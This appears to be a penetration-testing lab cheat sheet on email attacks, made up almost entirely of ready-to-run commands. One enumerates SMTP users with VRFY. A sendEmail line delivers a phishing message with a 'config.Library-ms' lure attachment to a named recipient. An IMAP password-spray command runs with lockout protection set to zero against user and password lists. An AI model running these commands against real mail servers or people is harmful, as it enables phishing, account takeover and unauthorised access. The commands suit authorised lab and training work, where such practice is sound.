#email


```bash
VRFY root
```

#### SendEmails

```bash
sendEmail -t "Dave.Wizard@supermagicorg.com" -f "test@supermagicorg.com" -u "Subject" -a config.Library-ms -s 192.168.236.199  -m "Check out this config" -xu "test@supermagicorg.com"  -xp "test"
```


### Password Spray

```bash
sudo poetry run ./imapsprayer.py -t 192.168.222.189 -U ~/boxes/relia/emails.txt -P ~/boxes/relia/pass.txt --lockout 0
```
